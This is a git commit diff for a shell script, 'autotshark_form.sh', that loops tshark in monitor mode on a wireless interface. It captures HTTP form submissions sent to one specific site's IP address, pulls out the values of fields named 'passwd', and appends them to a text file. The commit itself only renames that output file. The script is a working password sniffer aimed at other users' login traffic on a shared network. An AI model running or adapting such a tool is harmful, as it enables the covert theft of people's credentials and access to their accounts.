d6a95c4843e00b72737251caa792a0d45f3ea933
WALT-WANG <walterwang.inboxes@gmail.com>
2017-09-07 10:09:51 +0800

    modified autotshark_form.sh

--- autotshark_form/autotshark_form.sh
+++ autotshark_form/autotshark_form.sh
@@ -3,7 +3,7 @@ while True;
 	do
 	clear
 	if ping -o www.alevel.com.cn; then
-		gtimeout 60 tshark -i en0 -I -f 'dst host 210.22.15.252' -Y 'urlencoded-form.key == "passwd"' -Tfields -e 'urlencoded-form.value' >>filename.txt 
+		gtimeout 60 tshark -i en0 -I -f 'dst host 210.22.15.252' -Y 'urlencoded-form.key == "passwd"' -Tfields -e 'urlencoded-form.value' >>namelist.txt 
 		
 	fi
 done
